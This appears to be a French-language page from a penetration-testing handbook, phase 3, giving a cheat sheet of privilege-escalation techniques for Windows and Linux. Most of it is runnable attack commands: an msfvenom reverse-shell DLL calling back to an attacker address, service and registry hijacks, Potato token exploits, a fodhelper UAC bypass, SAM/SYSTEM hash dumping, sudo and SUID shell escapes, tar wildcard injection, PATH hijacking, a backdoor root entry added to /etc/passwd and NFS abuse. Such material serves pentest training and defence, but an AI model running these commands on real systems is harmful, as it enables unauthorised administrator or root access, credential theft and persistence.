# ⬆️ Phase 3: Élévation de privilèges

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](03-Privilege-Escalation.tr.md) • [🇬🇷 Ελληνικά](03-Privilege-Escalation.el.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Objectif :** Passer des droits d’un utilisateur standard à ceux d’Administrator/SYSTEM (Windows) ou de root (Linux).

> 📚 **Guides complets :** [Windows PrivEsc](../../Windows-PrivEsc/README.md) | [Linux PrivEsc](../../Linux-PrivEsc/README.md)

> **Précision :** les plages de versions et les exemples historiques sont des indications du texte source, pas une garantie de vulnérabilité. Les correctifs rétroportés, les droits effectifs et les configurations comptent également. Le contournement de l’UAC suppose généralement un compte déjà membre des administrateurs ; il ne transforme pas à lui seul un utilisateur standard en administrateur. Le hash `xyz...` est un espace réservé.

---

## 🖥️ Élévation de privilèges sous Windows

### Pistes rapides à vérifier en premier
```cmd
# Vérifier les privilèges actuels
whoami /priv
whoami /groups

# Rechercher des identifiants enregistrés
cmdkey /list

# Fichiers d’installation sans assistance
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploitation des services

#### Chemin de service sans guillemets
```cmd
# Rechercher les chemins sans guillemets
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Si le chemin suivant est trouvé : C:\Program Files\Some Service\service.exe
# Placer un exécutable malveillant à l’emplacement suivant : C:\Program.exe ou C:\Program Files\Some.exe
```

#### Autorisations de service trop permissives
```cmd
# Vérifier les autorisations des services avec accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Si SERVICE_CHANGE_CONFIG est accordé :
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### Détournement de DLL (DLL hijacking)
```powershell
# Rechercher des services dont les DLL sont absentes (avec Process Monitor)
# Placer une DLL malveillante dans le répertoire du service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Usurpation de jeton (token impersonation)

#### SeImpersonatePrivilege (Attaques Potato)
```cmd
# Vérifier la présence de SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# Sauvegarder SAM et SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Extraire les empreintes sur la machine d’attaque
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Exploitation du Registre
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Chemins modifiables des tâches planifiées
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Autorisations du Registre
accesschk.exe -kvw hklm\SOFTWARE
```

### Contournement de l’UAC
```powershell
# Contournement par fodhelper (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Outils automatisés
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Élévation de privilèges sous Linux

### Pistes rapides à vérifier en premier
```bash
# Autorisations sudo
sudo -l

# Binaires SUID
find / -perm -4000 -type f 2>/dev/null

# /etc/passwd accessible en écriture
ls -la /etc/passwd

# Version du noyau pour rechercher des exploits
uname -a
```

### Exploitation de sudo

#### Sudo sans mot de passe
```bash
# Si sudo -l affiche : (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Si sudo -l affiche : (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Si sudo -l affiche : (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Exploitation d’une version vulnérable de sudo (CVE-2021-3156)
```bash
# Vérifier la version de sudo
sudo --version

# Si sudo < 1.9.5p2
# Utiliser l’exploit: https://github.com/blasty/CVE-2021-3156
```

### Binaires SUID/SGID
```bash
# Rechercher les binaires SUID
find / -perm -4000 -type f 2>/dev/null

# Consulter GTFOBins pour les possibilités d’exploitation
# https://gtfobins.github.io/

# Exemple : bit SUID sur /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Exemple : bit SUID sur /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Exemple : bit SUID sur /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities (privilèges Linux attribués séparément)
```bash
# Rechercher les binaires dotés de capabilities
getcap -r / 2>/dev/null

# Exemple : cap_setuid sur python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Tâches cron
```bash
# Examiner les tâches cron
cat /etc/crontab
ls -la /etc/cron.*

# Rechercher des scripts modifiables
# Injection par caractères génériques dans tar :
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### Détournement de PATH
```bash
# Si une tâche cron ou un script appelle un binaire sans chemin absolu
# Créer un binaire malveillant dans un répertoire de PATH accessible en écriture

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### /etc/passwd accessible en écriture
```bash
# Si /etc/passwd est accessible en écriture
# Générer l’empreinte du mot de passe
openssl passwd -1 -salt evil password123

# Ajouter un utilisateur root
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Se connecter avec le nouvel utilisateur root
su evil
```

### Exploitation du noyau
```bash
# Vérifier la version du noyau
uname -r
cat /proc/version

# Rechercher des exploits
searchsploit linux kernel 4.4 privilege escalation

# Exploits du noyau connus :
# - DirtyCow (CVE-2016-5195) - Noyau 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Noyau 5.8 - 5.16.11
```

### Exploitation de NFS
```bash
# Vérifier la présence de no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# Si no_root_squash est activé :
# Monter le partage et créer un binaire SUID en tant que root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# Sur la cible :
/mnt/bash -p
```

### Outils automatisés
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

## 📊 Aide-mémoire

### Liste de vérification Windows
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup, etc.)
- [ ] Chemins de service sans guillemets
- [ ] Autorisations de service trop permissives
- [ ] AlwaysInstallElevated
- [ ] Identifiants enregistrés (cmdkey /list)
- [ ] Fichiers Unattend/Sysprep
- [ ] Tâches planifiées
- [ ] Exécuter WinPEAS/PowerUp
```

### Liste de vérification Linux
```markdown
- [ ] sudo -l
- [ ] Binaires SUID (consulter GTFOBins)
- [ ] Capabilities (privilèges Linux attribués séparément)
- [ ] Tâches cron (scripts modifiables, caractères génériques)
- [ ] /etc/passwd accessible en écriture
- [ ] Version du noyau (exploits)
- [ ] NFS no_root_squash
- [ ] Exécuter LinPEAS
```

---

## 🔗 Fiches associées

- [Élévation de privilèges Windows (guide complet)](../../Windows-PrivEsc/README.md)
- [Élévation de privilèges Linux (guide complet)](../../Linux-PrivEsc/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Phase précédente :** [← 02 - Énumération](./02-Enumeration.fr.md)

**Phase suivante :** [04 - Déplacement latéral →](./04-Lateral-Movement.fr.md)
